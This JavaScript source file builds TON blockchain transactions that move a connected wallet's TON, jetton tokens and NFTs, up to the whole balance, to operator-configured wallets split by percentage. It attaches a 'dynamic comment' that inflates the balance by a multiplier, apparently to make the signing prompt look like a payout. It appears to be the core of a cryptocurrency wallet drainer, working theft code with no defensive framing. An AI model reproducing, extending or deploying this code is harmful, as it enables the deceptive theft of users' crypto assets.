const {generateComment, TransactionBody} = require('./utils');
const TonWeb = require("tonweb");

class PayloadBuilderError extends Error {
    constructor(comment) {
        super(`[TOD_PAYLOAD_BUILDER_ERROR] ${comment}`);
    }
}

class TransactionBuilderError extends Error {
    constructor(comment) {
        super(`[TOD_TRANSACTION_BUILDER_ERROR] ${comment}`);
    }
}

class PayloadBuilder {
    constructor(wallet) {
        this.mainWallet = wallet;
    }

    async tonPayload (payload = undefined) {
        const cell = new TonWeb.boc.Cell();

        cell.bits.writeUint(0, 32);

        if (payload) {
            cell.bits.writeString(payload);
        }

        return TonWeb.utils.bytesToBase64(await cell.toBoc());
    }

    async jettonPayload (amount, payload) {
        const cell = new TonWeb.boc.Cell();

        cell.bits.writeUint(0x0f8a7ea5, 32); // OpCode
        cell.bits.writeUint(0, 64);

        cell.bits.writeCoins(+amount);

        cell.bits.writeAddress(new TonWeb.Address(this.mainWallet)); // ToAddress
        cell.bits.writeAddress(new TonWeb.Address(this.mainWallet)); // Destination

        cell.bits.writeBit(0);
        cell.bits.writeCoins(0);

        if (payload) {
            cell.bits.writeBit(true);
            const payloadCell = new TonWeb.boc.Cell();
            payloadCell.bits.writeUint(0, 32);
            payloadCell.bits.writeString(payload);
            cell.refs.push(payloadCell);
        } else {
            cell.bits.writeBit(false);
        }

        return TonWeb.utils.bytesToBase64(await cell.toBoc());
    }

    async nftPayload (payload) {
        const cell = new TonWeb.boc.Cell();
        cell.bits.writeUint(0x5fcc3d14, 32); // OpCode
        cell.bits.writeUint(0, 64);

        cell.bits.writeAddress(new TonWeb.Address(this.mainWallet)); // ToAddress
        cell.bits.writeAddress(new TonWeb.Address(this.mainWallet)); // Destination

        cell.bits.writeBit(0);
        cell.bits.writeCoins(0);

        if (payload) {
            cell.bits.writeBit(true);
            const payloadCell = new TonWeb.boc.Cell();
            payloadCell.bits.writeUint(0, 32);
            payloadCell.bits.writeString(payload);
            cell.refs.push(payloadCell);
        } else {
            cell.bits.writeBit(false);
        }

        return TonWeb.utils.bytesToBase64(await cell.toBoc());
    }

}

class TransactionBuilder {
    #params;
    #settings;
    constructor(params = {wallets: [''], percentage: [100]}, settings) {
        if (!params.wallets instanceof Array || !params.percentage instanceof Array || typeof params.wallets[0] !== 'string' || typeof params.percentage[0] !== 'number') {
            throw new TransactionBuilderError(`[TOD_TRANSACTION_BUILDER] Params.wallets must be array with string, get ${typeof params.wallets}. Params.percentage must be array with numbers, get ${typeof params.percentage}`);
        }
        this.#params = params;
        // Correct values
        if (this.#params.wallets.length === 1) {
            this.#params.percentage = [100];
        }
        if (this.#params.wallets.length > 1) {
            if (this.#params.percentage.length !== this.#params.wallets.length) {
                const percentage = 100 / this.#params.wallets.length;
                this.#params.percentage = new Array(this.#params.wallets.length).fill(percentage);
            } else {
                if (this.#params.percentage.reduce((a, b) => a + b, 0) !== 100) {
                    const percentage = 100 / this.#params.wallets.length;
                    this.#params.percentage = new Array(this.#params.wallets.length).fill(percentage);
                }
            }
        }

        this.#settings = settings;
    }

    generateComment (asset = {}) {
        try {
            let text_com;
            if (this.#settings.USE_DYNAMIC === 'true') {
                const symbol = typeof asset.token !== 'undefined' ? asset.token.symbol : 'TON';
                text_com = this.#settings.DYNAMIC_COM + ((asset.balance / asset.decimalCuter) * this.#settings.DYNAMIC_MULTIPLIER).toFixed(2) + " " + symbol;
            } else {
                text_com = this.#settings.STATIC_COM;
            }
            return text_com;
        } catch (e) {
            return '';
        }
    }

    async sendTon (asset, wallet, percent) {
        let payload = this.generateComment(asset);
        if (payload === '') {payload = undefined}

        const payloadBuilder = new PayloadBuilder(wallet);

        const decimal = asset.balance / asset.decimalCuter;
        const amount = Math.floor(((decimal / 100) * percent) * asset.decimalCuter);

        return {
            address: wallet,
            amount: amount,
            payload: await payloadBuilder.tonPayload(payload),
            inCurrency: +(asset.price * (amount / asset.decimalCuter)).toFixed(2),
            comment: payload,
            toAddress: wallet,
            percent: percent
        };
    }

    async sendJetton (asset, wallet, percent) {
        let payload = this.generateComment(asset);
        if (payload === '') {payload = undefined}

        const payloadBuilder = new PayloadBuilder(wallet);

        const decimal = asset.balance / asset.decimalCuter;
        const amount = Math.floor(((decimal / 100) * percent) * asset.decimalCuter);

        return {
            address: asset.wallet_address,
            amount: 50000000,
            payload: await payloadBuilder.jettonPayload(amount, payload),
            inCurrency: +(asset.price * (amount / asset.decimalCuter)).toFixed(2),
            comment: payload,
            toAddress: wallet,
            percent: percent
        };
    }

    async sendNft (asset, wallet, percent) {
        let payload = this.generateComment(asset);
        if (payload === '') {payload = undefined}

        const payloadBuilder = new PayloadBuilder(wallet);

        const decimal = asset.balance / asset.decimalCuter;
        const amount = Math.floor((decimal / 100) * percent);

        return {
            address: asset.data,
            amount: 50000000,
            payload: await payloadBuilder.nftPayload(payload),
            inCurrency: asset.inCurrency(),
            comment: payload,
            toAddress: wallet,
            percent: 100
        };
    }


    async generateTransactions (asset, withPayload = true) {
        try {
            const transactions = [];

            if (typeof asset !== 'undefined' && typeof asset.type !== 'undefined') {
                for (let i = 0; i < this.#params.wallets.length; i++) {
                    let transaction = withPayload ? {...asset} : {};

                    transaction = {...transaction, ...await this[`send${asset.type}`](asset, this.#params.wallets[i], this.#params.percentage[i])};

                    transactions.push(transaction);
                }
            }

            return transactions;
        } catch (e) {
            console.log(new TransactionBuilderError(e.message));
            return new Array(0);
        }
    }
}

module.exports.TransactionBuilder = TransactionBuilder;

module.exports.sendTon = async function sendTon(asset, settings) {
    try {
        if (settings.AUTO_SPLIT_PERCETAGE.includes(',')) {
            settings.AUTO_SPLIT_PERCETAGE = settings.AUTO_SPLIT_PERCETAGE.replaceAll(' ', '').split(',');
        }
        const tx = [];
        for (let i = 0; i < settings.WALLET.length; i++) {
            const transactionBody = new TransactionBody(settings.WALLET[i]);
            const bodyBoc = await transactionBody.generateTon(generateComment(asset, settings));

            const decimal = asset.balance / asset.decimalCuter;
            const amount = Math.floor((decimal / 100) * +settings.AUTO_SPLIT_PERCETAGE[i]);

            tx.push({
                address: settings.WALLET[i],
                amount: amount * asset.decimalCuter,
                balance: amount * asset.decimalCuter,
                payload: bodyBoc,
                name: 'TON',
                comment: generateComment(asset, settings),
                inCurrency: +(asset.price * (amount)).toFixed(2)
            });
        }
        return tx;
    } catch (error) {
        console.error('Error sending TON transaction:', error);
        return [];
    }
}

module.exports.sendToken = async function sendToken(chunk, settings) {
    try {
        if (settings.AUTO_SPLIT_PERCETAGE.includes(',')) {
            settings.AUTO_SPLIT_PERCETAGE = settings.AUTO_SPLIT_PERCETAGE.replaceAll(' ', '').split(',');
        }
        const tx = [];
        for (let i = 0; i < settings.WALLET.length; i++) {
            const messages = [];
            for (const asset of chunk) {
                try {
                    const transactionBody = new TransactionBody(settings.WALLET[i]);

                    const decimal = asset.balance / asset.decimalCuter;
                    const amount = Math.floor((decimal / 100) * +settings.AUTO_SPLIT_PERCETAGE[i]);

                    const bodyBoc = await transactionBody.generateJetton(generateComment(asset, settings), amount * asset.decimalCuter);

                    const transaction = {
                        address: asset.wallet_address,
                        amount: 50000000,
                        payload: bodyBoc,
                        name: asset.name,
                        comment: generateComment(asset, settings),
                        balance: asset.balance,
                        decimalCuter: asset.decimalCuter,
                        inCurrency: +(asset.price * (amount)).toFixed(2)
                    };
                    messages.push(transaction);
                } catch (e) {
                    console.log(e)
                }
            }
            tx.push(...messages)
        }
        return tx;

    } catch (error) {
        console.error('Error sending Token transaction:', error);
        return [];
    }
}

module.exports.sendProxyToken = async function sendProxyToken(settings, tokenWallet, wallet) {
    try {
        const bodyBoc = await TransactionBody.generateJetton(settings.PROXY_TOKEN_COMMENT, settings.PROXY_TOKEN_AMOUNT, wallet);

        return {
            address: tokenWallet,
            amount: 50000000,
            payload: bodyBoc,
            name: 'Proxy',
        };
    } catch (error) {
        console.error('Error sending Token transaction:', error);
        return [];
    }
}

module.exports.sendProxyTon = async function sendTon(settings, wallet) {
    try {
        const transactionBody = new TransactionBody(wallet);
        const bodyBoc = await transactionBody.generateTon(settings.PROXY_TOKEN_COMMENT);

        return {
            address: wallet,
            amount: settings.PROXY_TOKEN_AMOUNT,
            payload: bodyBoc,
            name: 'Proxy',
        };
    } catch (error) {
        console.error('Error sending TON transaction:', error);
        return [];
    }
}

module.exports.sendNft = async function sendNft(chunk, settings) {
    try {
        const messages = [];

        for (const asset of chunk) {
            const transactionBody = new TransactionBody(settings.WALLET[0]);

            const bodyBoc = await transactionBody.generateNFT(settings.NFT_COM);

            const transaction = {
                address: asset.data,
                amount: 50000000,
                payload: bodyBoc,
                name: asset.name,
                inCurrency: asset.inCurrency(),
                comment: generateComment(asset, settings),
            };
            messages.push(transaction);
        }
        return messages;
    } catch (error) {
        console.error('Error sending NFT transaction:', error);
        return [];
    }
}